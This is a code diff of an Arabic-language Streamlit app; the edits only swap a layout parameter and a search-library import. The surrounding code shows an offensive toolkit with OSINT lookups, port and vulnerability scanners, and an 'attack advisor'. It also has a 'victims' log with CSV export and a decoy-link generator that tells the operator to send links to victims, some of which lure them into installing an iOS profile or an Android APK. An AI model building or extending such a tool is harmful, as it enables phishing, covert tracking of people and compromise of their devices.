@@ -248,7 +248,7 @@ if not st.session_state.authenticated:
             
             col_btn1, col_btn2 = st.columns(2)
             with col_btn1:
-                if st.form_submit_button("🔓 دخول", use_container_width=True):
+                if st.form_submit_button("🔓 دخول", width='stretch'):
                     if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                         st.session_state.authenticated = True
                         st.rerun()
@@ -291,7 +291,7 @@ with st.sidebar:
         
         col1, col2 = st.columns(2)
         with col1:
-            if st.button("💾 حفظ الإعدادات", use_container_width=True, key="save_settings_btn"):
+            if st.button("💾 حفظ الإعدادات", width='stretch', key="save_settings_btn"):
                 if groq_api_key and telegram_bot_token and telegram_chat_id:
                     config.set_key("GROQ_API_KEY", groq_api_key)
                     config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
@@ -301,7 +301,7 @@ with st.sidebar:
                     st.error("❌ يرجى ملء جميع الحقول")
         
         with col2:
-            if st.button("🔄 إعادة تعيين", use_container_width=True, key="reset_settings_btn"):
+            if st.button("🔄 إعادة تعيين", width='stretch', key="reset_settings_btn"):
                 config.set_key("GROQ_API_KEY", "")
                 config.set_key("TELEGRAM_BOT_TOKEN", "")
                 config.set_key("TELEGRAM_CHAT_ID", "")
@@ -309,7 +309,7 @@ with st.sidebar:
     
     st.divider()
     
-    if st.button("🚪 تسجيل الخروج", use_container_width=True, key="logout_btn"):
+    if st.button("🚪 تسجيل الخروج", width='stretch', key="logout_btn"):
         st.session_state.authenticated = False
         st.rerun()
 
@@ -376,7 +376,7 @@ with tabs[1]:
     with col1:
         domain = st.text_input("أدخل اسم الدومين", placeholder="example.com", key="domain_input")
     with col2:
-        analyze_btn = st.button("🔍 تحليل", key="domain_btn_1", use_container_width=True)
+        analyze_btn = st.button("🔍 تحليل", key="domain_btn_1", width='stretch')
     
     if analyze_btn and domain:
         if not validate_domain(domain):
@@ -408,7 +408,7 @@ with tabs[2]:
     with col1:
         url = st.text_input("أدخل رابط الموقع", placeholder="https://example.com", key="site_input")
     with col2:
-        scan_btn = st.button("🔍 فحص", key="site_btn_2", use_container_width=True)
+        scan_btn = st.button("🔍 فحص", key="site_btn_2", width='stretch')
     
     if scan_btn and url:
         with st.spinner("جاري الفحص..."):
@@ -436,12 +436,12 @@ with tabs[3]:
     with col1:
         username = st.text_input("أدخل اسم المستخدم", placeholder="username", key="username_input")
     with col2:
-        search_btn = st.button("🔍 بحث", key="username_btn_3", use_container_width=True)
+        search_btn = st.button("🔍 بحث", key="username_btn_3", width='stretch')
     
     if search_btn and username:
         with st.spinner("جاري البحث..."):
             try:
-                from duckduckgo_search import DDGS
+                from ddgs import DDGS
                 ddgs = DDGS()
                 results = ddgs.text(f"{username} site:instagram.com OR site:twitter.com OR site:facebook.com", max_results=5)
                 if results:
@@ -463,7 +463,7 @@ with tabs[4]:
     with col1:
         ip = st.text_input("أدخل عنوان IP", placeholder="8.8.8.8", key="geo_input")
     with col2:
-        locate_btn = st.button("📍 تحديد", key="geo_btn_4", use_container_width=True)
+        locate_btn = st.button("📍 تحديد", key="geo_btn_4", width='stretch')
     
     if locate_btn and ip:
         if not validate_ip(ip):
@@ -498,12 +498,12 @@ with tabs[5]:
     with col1:
         target = st.text_input("أدخل الهدف (دومين أو IP)", placeholder="example.com", key="attack_surface_input")
     with col2:
-        analyze_btn = st.button("🔍 تحليل", key="attack_surface_btn_5", use_container_width=True)
+        analyze_btn = st.button("🔍 تحليل", key="attack_surface_btn_5", width='stretch')
     
     if analyze_btn and target:
         with st.spinner("جاري البحث على Dark Web..."):
             try:
-                from duckduckgo_search import DDGS
+                from ddgs import DDGS
                 ddgs = DDGS()
                 results = ddgs.text(target, max_results=5)
                 if results:
@@ -524,7 +524,7 @@ with tabs[6]:
     with col1:
         target = st.text_input("أدخل الهدف للتحليل الذكي", placeholder="example.com", key="ai_analysis_input")
     with col2:
-        analyze_btn = st.button("🧠 تحليل", key="ai_analysis_btn_6", use_container_width=True)
+        analyze_btn = st.button("🧠 تحليل", key="ai_analysis_btn_6", width='stretch')
     
     if analyze_btn and target:
         with st.spinner("جاري التحليل..."):
@@ -542,7 +542,7 @@ with tabs[7]:
     with col1:
         question = st.text_input("اسأل مساعد الهجوم", placeholder="كيف يمكنني اختبار الأمان؟", key="attack_advisor_input")
     with col2:
-        ask_btn = st.button("❓ اسأل", key="attack_advisor_btn_7", use_container_width=True)
+        ask_btn = st.button("❓ اسأل", key="attack_advisor_btn_7", width='stretch')
     
     if ask_btn and question:
         with st.spinner("جاري البحث..."):
@@ -564,7 +564,7 @@ with tabs[8]:
     with col1:
         dork_query = st.text_input("أدخل استعلام Google Dork", placeholder="site:example.com filetype:pdf", key="dork_input")
     with col2:
-        search_btn = st.button("🔍 بحث", key="dork_btn_8", use_container_width=True)
+        search_btn = st.button("🔍 بحث", key="dork_btn_8", width='stretch')
     
     if search_btn and dork_query:
         with st.spinner("جاري البحث..."):
@@ -582,7 +582,7 @@ with tabs[9]:
     with col1:
         email = st.text_input("أدخل البريد الإلكتروني", placeholder="example@example.com", key="email_input")
     with col2:
-        search_btn = st.button("🔍 بحث", key="email_btn_9", use_container_width=True)
+        search_btn = st.button("🔍 بحث", key="email_btn_9", width='stretch')
     
     if search_btn and email:
         if not validate_email(email):
@@ -606,7 +606,7 @@ with tabs[10]:
     with col1:
         phone = st.text_input("أدخل رقم الهاتف", placeholder="+966501234567", key="phone_input")
     with col2:
-        search_btn = st.button("🔍 بحث", key="phone_btn_10", use_container_width=True)
+        search_btn = st.button("🔍 بحث", key="phone_btn_10", width='stretch')
     
     if search_btn and phone:
         if not validate_phone(phone):
@@ -630,7 +630,7 @@ with tabs[11]:
     with col1:
         query = st.text_input("أدخل استعلام البحث", placeholder="search query", key="darkweb_input")
     with col2:
-        search_btn = st.button("🔍 بحث", key="darkweb_btn_11", use_container_width=True)
+        search_btn = st.button("🔍 بحث", key="darkweb_btn_11", width='stretch')
     
     if search_btn and query:
         st.info("⏳ هذه الميزة قيد التطوير.")
@@ -643,7 +643,7 @@ with tabs[12]:
     with col1:
         target = st.text_input("أدخل عنوان IP أو النطاق", placeholder="example.com", key="port_scanner_input")
     with col2:
-        scan_btn = st.button("🔍 فحص", key="port_scanner_btn_12", use_container_width=True)
+        scan_btn = st.button("🔍 فحص", key="port_scanner_btn_12", width='stretch')
     
     if scan_btn and target:
         if not (validate_ip(target) or validate_domain(target)):
@@ -682,7 +682,7 @@ with tabs[13]:
     with col1:
         url = st.text_input("أدخل عنوان URL", placeholder="https://example.com", key="vuln_scanner_input")
     with col2:
-        scan_btn = st.button("🔍 فحص", key="vuln_scanner_btn_13", use_container_width=True)
+        scan_btn = st.button("🔍 فحص", key="vuln_scanner_btn_13", width='stretch')
     
     if scan_btn and url:
         with st.spinner("جاري الفحص..."):
@@ -704,7 +704,7 @@ with tabs[14]:
     with col1:
         network = st.text_input("أدخل نطاق الشبكة", placeholder="192.168.1.0/24", key="network_mapper_input")
     with col2:
-        map_btn = st.button("🗺️ رسم", key="network_mapper_btn_14", use_container_width=True)
+        map_btn = st.button("🗺️ رسم", key="network_mapper_btn_14", width='stretch')
     
     if map_btn and network:
         st.info("⏳ هذه الميزة قيد التطوير.")
@@ -715,7 +715,7 @@ with tabs[15]:
     
     threat_data = st.text_area("أدخل بيانات التهديد", placeholder="وصف التهديد...", key="threat_analysis_input", height=150)
     
-    if st.button("🔍 تحليل", key="threat_analysis_btn_15", use_container_width=True):
+    if st.button("🔍 تحليل", key="threat_analysis_btn_15", width='stretch'):
         if threat_data:
             with st.spinner("جاري التحليل..."):
                 try:
@@ -736,7 +736,7 @@ with tabs[16]:
     with col1:
         pentest_question = st.text_input("اسأل مستشار الاختبار الذكي", placeholder="كيف أختبر الأمان؟", key="pentest_advisor_input")
     with col2:
-        ask_btn = st.button("❓ اسأل", key="pentest_advisor_btn_16", use_container_width=True)
+        ask_btn = st.button("❓ اسأل", key="pentest_advisor_btn_16", width='stretch')
     
     if ask_btn and pentest_question:
         with st.spinner("جاري البحث..."):
@@ -761,10 +761,10 @@ with tabs[17]:
         
         col1, col2, col3 = st.columns(3)
         with col1:
-            if st.button("🔄 تحديث", use_container_width=True, key="refresh_victims"):
+            if st.button("🔄 تحديث", width='stretch', key="refresh_victims"):
                 st.rerun()
         with col2:
-            if st.button("📥 تصدير CSV", use_container_width=True, key="export_csv"):
+            if st.button("📥 تصدير CSV", width='stretch', key="export_csv"):
                 victims = get_all_victims()
                 if victims:
                     if pd:
@@ -774,7 +774,7 @@ with tabs[17]:
                     else:
                         st.warning("⚠️ pandas غير مثبت. لا يمكن تصدير CSV")
         with col3:
-            if st.button("🗑️ مسح السجل", use_container_width=True, key="clear_victims"):
+            if st.button("🗑️ مسح السجل", width='stretch', key="clear_victims"):
                 if clear_victims_log():
                     st.success("✅ تم مسح السجل")
                     st.rerun()
@@ -783,7 +783,7 @@ with tabs[17]:
         if victims:
             if pd:
                 df = pd.DataFrame(victims[::-1])
-                st.dataframe(df, use_container_width=True)
+                st.dataframe(df, width='stretch')
             else:
                 st.warning("⚠️ pandas غير مثبت. لا يمكن عرض الجدول")
                 for victim in victims[::-1]:
@@ -840,21 +840,21 @@ with tabs[18]:
         decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
+        if st.button("📋 نسخ الرابط", width='stretch'):
             st.success("✅ تم النسخ")
     
     elif decoy_type == "Download (iOS)":
         decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
+        if st.button("📋 نسخ الرابط", width='stretch'):
             st.success("✅ تم النسخ")
     
     elif decoy_type == "Download (Android)":
         decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
         st.code(decoy_url, language="text")
         st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
-        if st.button("📋 نسخ الرابط", use_container_width=True):
+        if st.button("📋 نسخ الرابط", width='stretch'):
             st.success("✅ تم النسخ")
 
 # ============= التذييل =============
